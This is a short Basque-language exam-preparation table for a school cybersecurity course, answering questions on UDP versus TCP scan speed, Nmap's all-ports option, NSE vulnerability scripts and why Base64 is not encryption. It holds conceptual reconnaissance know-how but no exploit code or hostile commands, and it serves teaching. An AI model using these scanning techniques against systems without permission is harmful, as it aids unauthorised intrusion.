| **"Zergatik da UDP eskaneoa TCP baino askoz motelagoa?"** | *"UDP konexiorik gabekoa denez portu irekiek ez dutelako ACK bidaltzen (timeout itxaron behar da), eta portu itxietan Linux kernelak ICMP Port Unreachable erantzunak segundoko batera mugatzen dituelako (rate limiting)."* |
| **"Zergatik komeni da `-p-` eskaneatzea lehenetsitako portuez gain?"** | *"Nmap-ek lehenetsiz 1.000 portu ohikoenak bakarrik aztertzen dituelako. Erasotzaileek edo zerbitzu bereziek (adib. distccd 3632 edo msgsrvr 8787) portu altuak erabili ohi dituzte eta horiek ezkutuan geratuko lirateke `-p-` erabili ezean."* |
| **"Zer abantaila dute NSE scriptek (`--script=vuln`) bertsio-detekzio soilaren aldean?"** | *"Bertsio-eskaneoak bertsioaren izena bakarrik irakurtzen du; NSE scriptek, ordea, elkarrizketa aktibo ez-kaltegarriak bidaltzen dituzte zaurgarritasuna benetan existitzen eta ustiagarri dagoela frogatzeko (CVE zehatzak emanez)."* |
| **"Zergatik ez da Base64 zifratze algoritmo bat?"** | *"Base64 kodetze-eskema publiko bat delako, datu bitarrak testu inprimagarri bihurtzeko diseinatua. Ez du gakorik erabiltzen eta edonork deskodetu dezake berehala; beraz, ez du inolako konfidentzialtasunik ematen."* |

---
*Dokumentu hau Goierri Eskolako 2MG3 Zibersegurtasuneko 1. ebaluazioko azterketa prestatzeko sortu da.*
